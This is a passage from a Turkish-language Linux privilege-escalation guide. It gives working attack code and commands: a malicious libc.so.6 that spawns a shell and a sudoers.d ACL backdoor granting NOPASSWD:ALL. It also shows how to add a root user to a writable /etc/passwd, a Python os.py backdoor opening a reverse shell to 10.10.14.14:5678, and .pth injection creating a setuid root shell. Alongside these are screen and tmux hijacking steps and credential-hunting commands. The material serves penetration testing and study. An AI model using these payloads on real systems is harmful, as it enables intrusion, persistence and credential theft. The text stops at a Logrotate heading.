 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Ardından `/var/tmp` içinde `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` komutuyla kötü amaçlı bir kütüphane oluşturun.

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities, **mevcut root ayrıcalıklarının bir alt kümesini bir sürece sağlar**. Bu, root **ayrıcalıklarını daha küçük ve birbirinden bağımsız birimlere böler**. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Böylece ayrıcalıkların tamamı azaltılarak istismar riskleri düşürülür.\
Capabilities ve bunların nasıl kötüye kullanılabileceği hakkında **daha fazla bilgi edinmek** için aşağıdaki sayfayı okuyun:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde **"execute" biti**, ilgili kullanıcının klasöre "**cd**" yapabileceği anlamına gelir.\
**"read" biti**, kullanıcının **dosyaları** listeleyebileceği; **"write" biti** ise yeni **dosyalar** oluşturabileceği ve mevcut **dosyaları** silebileceği anlamına gelir.

## ACL'ler

Access Control Lists (ACL'ler), isteğe bağlı izinlerin ikincil katmanını oluşturur ve **geleneksel ugo/rwx izinlerini geçersiz kılabilir**. Bu izinler, dosya veya dizin erişimini; sahibi olmayan ya da grubun parçası olmayan belirli kullanıcılara haklar vererek veya bu hakları reddederek daha iyi kontrol etmenizi sağlar. Bu **ayrıntı düzeyi, erişimin daha hassas yönetilmesini sağlar**. Daha fazla bilgiye [**buradan**](https://linuxconfig.org/how-to-manage-acls-on-linux) ulaşabilirsiniz.<sup>[[19]](#references)</sup>

"kali" kullanıcısına bir dosya üzerinde okuma ve yazma izinleri **verin**:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Sistemde belirli ACL'lere sahip dosyaları alın**:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### sudoers drop-in dosyalarında gizli ACL arka kapısı

Yaygın bir yanlış yapılandırma, `/etc/sudoers.d/` içinde `440` moduna sahip root sahipli bir dosyanın ACL aracılığıyla düşük ayrıcalıklı bir kullanıcıya hâlâ yazma izni vermesidir.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

`user:alice:rw-` gibi bir şey görürseniz, kısıtlayıcı mod bitlerine rağmen kullanıcı bir sudo kuralı ekleyebilir:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Bu, `ls -l` ile yapılan incelemelerde kolayca gözden kaçabileceği için yüksek etkili bir ACL persistence/privesc yoludur.

## Açık shell oturumları

Kullanıcılar arası GNU Screen erişimi yalnızca sürüme değil, **çalışan oturumun yapılandırmasına ve ACL'sine** bağlıdır. [GNU Screen belgeleri](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html), multiuser desteğiyle derlenmiş olması gerektiğini belirtir; `multiuser on` ve bir `acladd` veya uygun bir `aclchg` izni, başka bir kullanıcının oturuma bağlanmasına olanak tanır. [Kılavuz ayrıca](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) kullanıcılar arası oturum araması için setuid-root gerektirir. Root sahipliğinde görünen bir socket veya tek başına bir SUID `screen` binary'si, root shell'e bağlanılabileceğini göstermez. Bunu bir privilege escalation olarak değerlendirmeden önce, çalışan oturumun multiuser olduğunu, mevcut kullanıcının etkili giriş/komut iznine sahip olduğunu ve bu oturumdaki shell'in ayrıcalıklı sahibin yetkileriyle çalıştığını doğrulayın.

### screen sessions hijacking

**Screen oturumlarını listeleme**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen oturumlarının ele geçirilmesi - Soket konumları (bazı sistemlerde biri diğerinin sembolik bağlantısı olarak sunulur): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Bir oturuma bağlan**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

Bu, **eski tmux sürümlerinde** bir sorundu. Root tarafından oluşturulan bir tmux (v2.1) oturumunu ayrıcalıksız bir kullanıcı olarak ele geçiremedim.

**tmux oturumlarını listele**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Socket konumları (bazı sistemlerde biri diğerinin symlink'i olarak sunulur) - tmux oturumlarını ele geçirme: tmux -S /tmp/dev sess ls Bu socket'i kullanarak listeleyin; bu socket'te bir tmux oturumu başlatabilirsiniz...](<../../images/image (837).png>)

**Bir oturuma bağlan**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Etkilenen Debian veya türevi OpenSSL derlemeleriyle, tarihsel güvenlik açığı döneminde oluşturulan anahtarların rastgeleliği tahmin edilebilir olabilir; ana makinenin mevcut dağıtımı veya yamalı OpenSSL sürümü, eski bir anahtarın nasıl oluşturulduğunu göstermez. **Belirli anahtarı** uygun bir tarihsel kara listeye ve kaynağına göre kontrol edin. Debian'ın [`ssh-vulnkey` kılavuzu](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) genel anahtarların ve `authorized_keys` dosyalarının kontrol edilmesini açıklar; [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) ise OpenSSL düzeltmesini kaydeder. Ayrıcalıklı bir hesabın `authorized_keys` dosyasındaki bir kayıt, yalnızca eşleşen özel anahtar kurtarılabiliyorsa ve etkin SSH ilkesi o hesabın bu anahtarla kimlik doğrulamasını hâlâ kabul ediyorsa ayrıcalık yükseltme için bir ipucudur; zayıf bir **ana makine** anahtarı tek başına giriş bilgisi değildir. Ele geçirilmiş anahtarları değiştirin ve eski yetkilendirmelerini kaldırın.

### SSH yapılandırmasındaki ilginç değerler

- **PasswordAuthentication:** Parola ile kimlik doğrulamaya izin verilip verilmediğini belirtir. OpenSSH upstream varsayılanı `yes` değeridir; dağıtım yapılandırması bunu değiştirebilir.
- **PubkeyAuthentication:** Genel anahtarla kimlik doğrulamaya izin verilip verilmediğini belirtir. Varsayılan değer `yes` şeklindedir.
- **PermitEmptyPasswords**: Parola ile kimlik doğrulamaya izin verildiğinde, sunucunun parola dizeleri boş olan hesaplara giriş izni verip vermediğini belirtir. Varsayılan değer `no` şeklindedir.

### Giriş denetimi dosyaları

Bu dosyalar kimin ve nasıl giriş yapabileceğini etkiler:

- **`/etc/nologin`**: varsa root olmayan kullanıcıların girişini engeller ve içindeki mesajı gösterir.
- **`/etc/securetty`**: root'un nereden giriş yapabileceğini kısıtlar (TTY izin listesi).
- **`/etc/motd`**: giriş sonrası gösterilen banner (ortam veya bakım ayrıntılarını leak edebilir).

### PermitRootLogin

Root'un ssh kullanarak giriş yapıp yapamayacağını belirtir. OpenSSH upstream varsayılanı `prohibit-password` değeridir; dağıtım yapılandırması bunu değiştirebilir. Olası değerler:

- `yes`: root parola veya özel anahtar kullanarak giriş yapabilir
- `without-password` veya `prohibit-password`: root yalnızca özel anahtarla giriş yapabilir
- `forced-commands-only`: Root yalnızca özel anahtar kullanarak ve komut seçenekleri belirtilmişse giriş yapabilir
- `no` : giriş yapılamaz

### Güvenilen SSH kullanıcı sertifikası yetkilileri

`TrustedUserCAKeys`, sshd'nin **kullanıcı** sertifikalarını imzalamak için güvendiği genel anahtarları belirtir. İlgili özel CA anahtarını düşük ayrıcalıklı bir kullanıcı okuyabiliyorsa kimin sertifika alabileceğini ve sertifikanın hangi hesaplarda kimlik doğrulaması yapabileceğini inceleyin. `AuthorizedPrincipalsFile` veya `AuthorizedPrincipalsCommand` kabul edilen adları kısıtlayabilir; ikisi de yapılandırılmamışsa sertifika hedef hesap adını içermelidir. `PermitRootLogin prohibit-password`, root için parola ile kimlik doğrulamayı engeller ancak sertifika ile kimlik doğrulamaya izin verebilir. Anahtar yolunun açığa çıkması tek başına erişimi kanıtlamaz: genel/özel anahtar çiftini, etkin `Match` kurallarını, hesap ilkesini, anahtar parolasını, iptal durumunu ve kabul edilen imza algoritmalarını doğrulayın. Özel anahtar baytlarını enumeration çıktısına eklemeyin. [OpenSSH sunucu yapılandırma kılavuzuna](https://man.openbsd.org/sshd_config#TrustedUserCAKeys) bakın.

Bir özel CA anahtarı, ayrıcalık devri kuralı kullanıcının anahtar sahibinin kimliğiyle kısıtlanmamış bir [`ssh-keygen -s` gibi sertifika imzalayıcıyı](https://man.openbsd.org/ssh-keygen#-s) çalıştırmasına izin veriyorsa, mevcut kullanıcı tarafından **okunamasa bile** kullanılabilir olabilir. İzin verilen tam komutu ve argümanları; imzalayıcı hesabının anahtara erişimi, etkin sshd yapılandırmasının güvendiği genel CA, hedef hesap için kabul edilen principal, sertifika geçerlilik süresi ve o hesabın giriş ilkesiyle birlikte değerlendirin. Devredilmiş bir imzalayıcı komutu veya güvenilen bir CA dosyası tek başına başka bir hesaba erişimi kanıtlamaz; pasif enumeration sırasında test sertifikası imzalamayın.

### AuthorizedKeysFile

Kullanıcı kimlik doğrulaması için kullanılabilecek genel anahtarları içeren dosyaları belirtir. `%h` gibi, ana dizinle değiştirilen token'lar içerebilir. **Mutlak yollar** (`/` ile başlayan) veya **kullanıcının ana dizinine göreli yollar** belirtebilirsiniz. Örneğin:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Bu yapılandırma, "**testusername**" kullanıcısının **private** anahtarıyla oturum açmaya çalıştığınızda ssh'nin anahtarınızın public key'ini `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` konumlarında bulunanlarla karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, anahtarları (passphrase olmadan!) sunucunuzda bırakmak yerine yerel SSH anahtarlarınızı **kullanmanıza** olanak tanır. Böylece ssh üzerinden **jump** yaparak **bir hosta** ulaşabilir ve oradan **başka bir hosta jump** yaparak, **kullanıp** **ilk hostunuzda** bulunan **key** ile bağlanabilirsiniz.

Bu seçeneği `$HOME/.ssh.config` dosyasında şu şekilde ayarlamanız gerekir:

```
Host example.com
  ForwardAgent yes
```

`Host` her seferinde kullanıcı farklı bir makineye geçtiğinde `*` ise, bu ana bilgisayar anahtarlara erişebilir (bu bir güvenlik sorunudur).

`/etc/ssh_config` dosyası bu **seçenekleri** **geçersiz kılabilir** ve bu yapılandırmaya izin verebilir veya vermeyebilir.\
`/etc/sshd_config` dosyası `AllowAgentForwarding` anahtar sözcüğüyle ssh-agent forwarding işlemine **izin verebilir** veya **vermeyebilir** (varsayılan olarak izin verilir).

Bir ortamda Forward Agent yapılandırıldığını fark ederseniz aşağıdaki sayfayı inceleyin; **yetkilerinizi yükseltmek için bunu kötüye kullanabilirsiniz**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

`/etc/profile` dosyası ve `/etc/profile.d/` altındaki dosyalar, **kullanıcı yeni bir shell başlattığında yürütülen betiklerdir**. Bu nedenle, bunlardan herhangi birine **yazabilir veya herhangi birini değiştirebilirseniz yetkilerinizi yükseltebilirsiniz**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Herhangi bir garip profile betiği bulunursa **hassas bilgiler** içerip içermediğini kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir ad kullanıyor olabilir veya bu dosyaların yedekleri bulunabilir. Bu nedenle, dosyaların tümünü **bulmanız** ve içinde **hash'ler olup olmadığını** görmek için **okuyup okuyamadığınızı kontrol etmeniz** önerilir:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Bazı durumlarda `/etc/passwd` (veya eşdeğer) dosyasında **password hashes** bulabilirsiniz.

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Yazılabilir /etc/passwd

İlk olarak, aşağıdaki komutlardan biriyle bir parola oluşturun.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Ardından `hacker` kullanıcısını ekleyin ve oluşturulan parolayı ekleyin.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Örn: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `hacker:hacker` ile `su` komutunu kullanabilirsiniz.

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: makinenin mevcut güvenliğini zayıflatabilirsiniz.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOT: BSD platformlarında `/etc/passwd`, `/etc/pwd.db` ve `/etc/master.passwd` dosyalarında bulunur; ayrıca `/etc/shadow` dosyasının adı `/etc/spwd.db` olarak değiştirilmiştir.

**Hassas dosyalara yazıp yazamadığınızı** kontrol etmelisiniz. Örneğin, herhangi bir **servis yapılandırma dosyasına** yazabilir misiniz?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Örneğin, makine bir **tomcat** sunucusu çalıştırıyorsa ve **/etc/systemd/ içindeki Tomcat hizmet yapılandırma dosyasını değiştirebiliyorsanız,** şu satırları değiştirebilirsiniz:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Backdoor'unuz, tomcat bir sonraki başlatıldığında çalıştırılacaktır.

### Klasörleri Kontrol Et

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama deneyin)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Tuhaf Konum/Sahip Olunan Dosyalar

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Son dakikalarda değiştirilen dosyalar

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite DB dosyaları

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Okunabilir uygulama veritabanlarında kullanıcı adları ve parola hash'leri için tablo ve sütun adlarını inceleyin. Bir hash bulmak, parolasını çözmek ve bu parolanın yerel bir hesapta yeniden kullanıldığını kanıtlamak ayrı adımlardır; 32 karakterlik genel bir onaltılık dizge, bunun MD5 olduğunu veya hesaba erişim sağladığını çıkarsamak için yeterli değildir.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyaları

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Okunabilir bir shell geçmişinde `sudo` komutunun ardından parola benzeri kısa bir satır varsa, çevresindeki satırları elle inceleyin. Normal `sudo` istemine girilen parola shell geçmişine kaydedilmez; sonraki satır yalnızca yanlışlıkla shell'e girilmiş olabilecek bir girdidir, geçerli bir parolanın kanıtı değildir. `.sudo_as_admin_successful` işaretçisi mevcut yetkilendirmeyi değil, daha önce kullanıldığını kaydeder.

### Gizli dosyalar

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH'teki Scriptler/İkili Dosyalar**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Web dosyaları**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Yedekler**

Yedekleme dizinlerindeki okunabilir dosyaları ve **adlarında** `backup` geçen dosyaları inceleyin: adı belirsiz olan veya şifreli uzantıya sahip bir arşiv bile eski uygulama verilerini açığa çıkarabilir. Şifreli bir arşiv yalnızca olası bir veri ifşasıdır. Parola kurtarma, arşiv içeriğini inceleme, uygulama hash'ini kurtarma ve bu parolayı bir Unix hesabında yeniden kullanma, doğrulanması gereken ayrı adımlardır; bir arşivde bulunan hash, yerel oturum açmanın mümkün olduğunu kanıtlamaz.

Okunabilir sanal makine yedekleri de aynı şekilde incelenmelidir. Bir VirtualBox `.vbox` yapılandırması, bağlı `.vdi` imajlarını belirleyebilir ve şifreli disk anahtarı meta verilerini içerebilir; [VirtualBox, şifreli veri anahtarının VM yapılandırmasında saklandığını belgeliyor](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Çevrimdışı disk incelemesinin mümkün olması için hem yapılandırmaya hem de imaja erişilebilmelidir. Konuk sistemde ayrıca ayrı bir anahtar gerektiren [LUKS şifreleme katmanı](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc) bulunabilir. Yetkili şekilde şifre çözme işleminden sonra bile eski betikler veya yapılandırmalar parola içerebilir; bunu yerel bir host hesabı için geçerli bir kimlik bilgisi olarak değerlendirmeden ve etkili `sudo` politikasının ayrıcalıklı bir komuta izin verdiğini doğrulamadan, bunu yerel ayrıcalık yükseltme olarak nitelendirmeyin. Pasif enumerasyon sırasında imajları kopyalamadan, şifrelerini çözmeden veya bağlamadan yolların ve izinlerin envanterini çıkarın.

Okunabilir bir arşivi incelerken, herhangi bir şeyi çıkarmadan önce arşiv üyelerinin adlarını listeleyin: canlı kopyalar korumalı olsa bile gizli kimlik doğrulayıcı dosyaları, kurtarma kodu verileri veya SSH anahtarları bulunabilir. Dosya adları yalnızca bir ipucudur; içeriği ve hesaplarda yeniden kullanımını ayrıca doğrulayın.

Yedekleme dizinlerinde başka bir kullanıcıya ait **okunabilir arşivlere** öncelik verin; özellikle root'a ait arşivleri ve grup üyeliği üzerinden erişilebilenleri inceleyin. Canlı kopya korumalı olsa bile eski bir arşiv yapılandırma veya kimlik doğrulama sırrı içerebilir. [Backrest](https://garethgeorge.github.io/backrest/) gibi yerel bir yedekleme arayüzünde hizmetin etkin hesabını ve düşük ayrıcalıklı bir kullanıcının yapılandırmasını okuyup okuyamadığını veya arayüzde kimlik doğrulaması yapıp yapamadığını kontrol edin. [Hook'ları](https://garethgeorge.github.io/backrest/docs/hooks) ve [restic komut arayüzü](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto), arka plan hizmetinin dosya ve komut ayrıcalıklarıyla çalışabilir; yalnızca loopback adresini dinlemesi etkinin boyutunu belirlemez. Backrest'in `passwordBcrypt` değeri, düz metin parola değil, [kimlik doğrulama kodunda](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go) kullanılan base64 kodlu bir bcrypt hash'idir. Açığa çıkan bir arşivi veya arayüzü ayrıcalık sınırı olarak değerlendirmeden önce hizmet kimliğini, kullanılabilir kimlik bilgilerini ve ilgili plana veya depoya erişimi doğrulayın.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Şifre içerebilecek bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin; **şifre içerebilecek çeşitli dosyaları** arar.\
Bunu yapmak için kullanabileceğiniz **bir diğer ilginç araç** da Windows, Linux ve Mac'te yerel bilgisayarda saklanan çok sayıda şifreyi almak için kullanılan açık kaynaklı bir uygulama olan [**LaZagne**](https://github.com/AlessandroZ/LaZagne)'dir.

`/etc/guacamole/guacamole.properties` dosyası okunabiliyorsa `mysql-*`, `postgresql-*` veya `sqlserver-*` veritabanı bağlantı ayarlarını inceleyin. Hesabın Guacamole JDBC tablolarını okuma yetkisi varsa `guacamole_connection_parameter` tablosunda kayıtlı SSH `username`, `password`, `private-key` veya `passphrase` değerleri bulunabilir. Önce bağlantı kimliklerini ve parametre adlarını kontrol edin, ardından yalnızca ilgili satırları inceleyin; kayıtlı bir değer yeniden kullanılabilir bir sır yerine dinamik bir token veya kasa referansı olabilir. [Guacamole JDBC şemasına](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) ve [SSH bağlantı parametrelerine](https://guacamole.apache.org/doc/gug/configuring-guacamole.html) bakın.

[pswm parola yöneticisi](https://github.com/Julynx/pswm#usage), varsayılan olarak `~/.local/share/pswm/pswm` konumunda şifrelenmiş bir kasa depolar. Başka bir kullanıcının kasası görünür durumdaysa sahipliğini ve hesabınızın kasayı gerçekten okuyup okuyamadığını kontrol edin. Kasa yolu tek başına kimlik bilgilerini açığa çıkarmaz; ana parolasını kurtarmak, yeniden kullanılabilir bir hesap parolası bulmak ve bu hesabın ayrıcalıklarını doğrulamak birbirinden ayrı adımlardır.

[Passpie'nin varsayılan veritabanı](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) `.keys` anahtarlığı ve grup dizinlerindeki şifrelenmiş `.pass` kimlik bilgisi dosyalarıyla birlikte `~/.passpie/` konumundadır. Görünür bir veritabanı dizini yalnızca bir yol ipucudur: anahtara ve ilgili şifrelenmiş girdiye erişiminizi, gerekli bir ana parola olup olmadığını ve kurtarılan kimlik bilgisinin daha ayrıcalıklı bir hesaba ait olup olmadığını doğrulayın. Passpie ayrıca [özel veritabanı yollarını](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases) destekler; bu nedenle varsayılan yol tüm olasılıkları kapsamaz. Otomatik numaralandırma, kimlik bilgilerini dışa aktarmadan veya anahtar materyalini yazdırmadan meta verileri listelemelidir.

### Günlükler

Günlükleri okuyabiliyorsanız içlerinde **ilginç/gizli bilgiler** bulabilirsiniz. Günlük ne kadar tuhafsa o kadar ilginç olabilir (muhtemelen).\
Ayrıca, "**kötü**" yapılandırılmış (arka kapılı?) bazı **audit log**'lar, bu gönderide açıklandığı gibi **şifreleri audit log'lara kaydetmenize** olanak tanıyabilir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Logları okuyabilmek için grup [adm](../../user-information/interesting-groups-linux-pe/index.html#adm-group) gerçekten faydalı olacaktır.

### Shell dosyaları

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Generic Creds Arama/Regex

Ayrıca adında veya içeriğinde "**password**" kelimesi geçen dosyaları aramalı, günlüklerde IP ve e-posta adreslerini ya da hash regex'lerini kontrol etmelisiniz.\
Bunların hepsini nasıl yapacağınızı burada anlatmayacağım; ancak ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından gerçekleştirilen son kontrolleri inceleyebilirsiniz.

## Yazılabilir dosyalar

### Python library hijacking

Bir Python betiğinin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **yazabiliyorsanız** veya Python kütüphanelerini **değiştirebiliyorsanız**, OS kütüphanesini değiştirip arka kapı ekleyebilirsiniz (Python betiğinin çalıştırılacağı yere yazabiliyorsanız, os.py kütüphanesini kopyalayıp yapıştırın).

**Kütüphaneye arka kapı eklemek** için os.py kütüphanesinin sonuna şu satırı eklemeniz yeterlidir (IP ve PORT'u değiştirin):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `site.addsitedir()` tarafından işlenen yazılabilir `.pth`

`site.addsitedir(DIR)` işlevini `sys.path.append(DIR)` ile eşdeğer kabul etmeyin. Bu işlev, `DIR` içindeki her `*.pth` dosyasını da işler. `import` ile başlayıp ardından boşluk veya sekme gelen bir satır, Python kodu olarak çalıştırılır. Yol satırları ise site dizinine göre çözümlenir ve yalnızca mevcutlarsa eklenir.<sup>[[38]](#references)</sup>

Sudo ile çalıştırılmasına izin verilen veya başka bir şekilde ayrıcalıklı bir Python programı, mevcut kullanıcı ya da kullanıcının gruplarından biri tarafından yazılabilir bir dizinde `site.addsitedir()` çağırdığında bu durum bir yetki yükseltme açığına dönüşür. Ayrıcalıklı program normal işlemini başlatmadan önce, içe aktarma yolunu ayarlarken `.pth` kodu çalıştırılır.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Çalıştırılabilir `.pth` içeriği tek satıra sığmalıdır, ancak noktalı virgüller birden fazla ifadeye izin verir. Örneğin, root yetkisiyle çalışan bir kod yolu, setuid bitine sahip bir Bash kopyası oluşturabilir; etkin kimliğini koruması için Bash’i `-p` ile çalıştırın.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

`-S` seçeneği yalnızca Python'ın otomatik `site` başlatmasını devre dışı bırakır. `site` modülünü açıkça içe aktarıp `site.addsitedir()` çağıran bir programı korumaz. Saldırganların yazabildiği dizinleri ayrıcalıklı içe aktarma yollarından kaldırın; dizinin ve `.pth` dosyalarının yalnızca ayrıcalıklı yönetici tarafından sahiplenildiğinden ve yazılabildiğinden emin olun.<sup>[[38]](#references)[[39]](#references)</sup>

### Logrotate istismarı

